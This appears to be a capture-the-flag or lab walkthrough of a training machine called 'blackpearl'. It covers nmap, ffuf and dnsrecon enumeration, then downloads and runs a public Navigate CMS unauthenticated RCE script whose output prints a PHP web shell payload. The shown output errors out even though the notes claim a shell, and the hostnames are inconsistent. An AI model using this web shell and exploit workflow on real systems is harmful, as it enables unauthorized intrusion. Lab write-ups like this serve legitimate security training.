
#blackpearl

IP: `192.168.64.8`



## Scanning and enumeration

- nmap -Pn -p- -A -T4 -oN nmapblackpearl.txt 192.168.64.8
```
┌──(root㉿kali)-[~]
└─# nmap -Pn -p- -A -T4 -oN nmapblackpearl.txt 192.168.64.8
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-10 09:45 PDT
Nmap scan report for 192.168.64.8
Host is up (0.0018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
MAC Address: BE:06:26:D7:D2:9F (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.84 ms 192.168.64.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.36 seconds
```

### Enumerating port 80

- No result in ffuf, no directories detected using the `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.64.8/FUZZ -mc 200,204,301,302,307,401,403,405`
- We did dns reconnaissance to know the name of the site and do FUZZ again using the ffuf. Based from the dns enumeration, the name is blackpearl.tcm. We also configured the blackpearl.tcm in the host file of our attacker's machine(kali)

```
┌──(root㉿kali)-[~]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.64.8/FUZZ -mc 200,204,301,302,307,401,403,405

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.64.8/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]
# Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 8ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 7ms]
                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 5ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 5ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 17ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 21ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 22ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 25ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 33ms]
# on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 31ms]
secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 2ms]
                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]
:: Progress: [220560/220560] :: Job [1/1] :: 9090 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# dnsrecon -r 127.0.0.0/24 -n 192.168.64.8 -d lk
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# cat /etc/resolv.conf                               
# Generated by NetworkManager
search home
nameserver 192.168.64.1
nameserver fe80::5ce9:1eff:fe0a:6464%eth0
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# mousepad /etc/resolv.conf                                                                
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# mousepad /etc/hosts      
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# mousepad /etc/hosts
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ -mc 200,204,301,302,307,401,403,405

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blackpearl.tcm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 20ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86784, Words: 4212, Lines: 1040, Duration: 29ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 37ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 45ms]
#                       [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 69ms]
# Copyright 2007 James Fisher [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 97ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86784, Words: 4212, Lines: 1040, Duration: 133ms]
#                       [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 151ms]
                        [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 178ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 193ms]
# on atleast 2 different hosts [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 204ms]
#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 219ms]
#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 231ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 234ms]
navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 16ms]
                        [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 13ms]
:: Progress: [220560/220560] :: Job [1/1] :: 9523 req/sec :: Duration: [0:00:27] :: Errors: 0 ::

```

- We see that there is 301 redirection which is the `navigate`
- Lets access the `http://blackpearl.tcm/navigate`

![[Pasted image 20240710132114.png]]

- The navigate cms login page appeared
- Check Google if there is a vulnerability in the navigate. Here are the relevant sites checked:
	- https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
	- https://www.exploit-db.com/exploits/45561
	- https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-
- We can run the exploit manually using the https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-

```
┌──(root㉿kali)-[~]
└─# wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh

./navigate_RCE.sh navigator.hm
--2024-07-10 10:26:21--  https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1000 [text/plain]
Saving to: ‘navigate_RCE.sh’

navigate_RCE.sh                        100%[============================================================================>]    1000  --.-KB/s    in 0s      

2024-07-10 10:26:22 (85.7 MB/s) - ‘navigate_RCE.sh’ saved [1000/1000]

┌──(root㉿kali)-[~]
└─# chmod u+x navigate_RCE.sh 
┌──(root㉿kali)-[~]
└─# ./navigate_RCE.sh                             

 URL:  http:///

 Sesion: 

Payload:
<?php system($_GET['cmd']);?>

Subiendo Exploit ...
curl: (3) URL using bad/illegal format or missing URL

Obteniendo webshell...
webshell$ 

```
- We landed to the webshell shell by doing it manually using the script from the github site. Now we will also try the metasploit.

- Checking the source code of the default website, we see the webmaster: `alek@blackpearl.tcm`

![[Pasted image 20240710125702.png]]


### Enumerating port 53

#dnsreconaissance

- DNS reconaissance to the victim using `dnsrecon -r 127.0.0.0/24 -n 192.168.64.8 -d lk`, we saw that the name of the victim's machine is **blackpearl.com**
```
┌──(root㉿kali)-[~]
└─# dnsrecon -r 127.0.0.0/24 -n 192.168.64.8 -d lk
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found

```

- Configure the host file `/etc/hosts` to give a name to the victim's machine

![[Pasted image 20240710130740.png]]

- After putting the hostname in the hostfile, the php web page appeared
![[Pasted image 20240710131738.png]]

- We can now enumerate again using ffuf. The enumeration is in the 80/http enumeration section above
- 